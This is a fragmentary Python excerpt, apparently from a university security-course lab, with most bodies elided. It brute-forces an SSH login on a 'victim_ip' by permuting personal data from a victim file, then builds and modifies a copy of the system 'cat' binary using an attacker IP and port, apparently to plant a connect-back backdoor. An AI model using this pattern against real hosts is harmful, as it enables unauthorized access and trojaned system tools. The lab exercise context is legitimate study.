...
def crack_password(victim_ip):
    f = open('/home/csc2022/materials/victim.dat')
    ...
    while True:
        for i in permutations(info_list, iter):
            ...
            if ssh_test(client, victim_ip, 'csc2022', password):
                return client
            client.close()
        iter += 1 
...
def construct_cat(attacker_ip, attacker_port):
    ...
    os.system("cp /home/csc2022/cat cat_backup")
...
def modify_cat():
    original_cat = open('/home/csc2022/cat', 'rb')
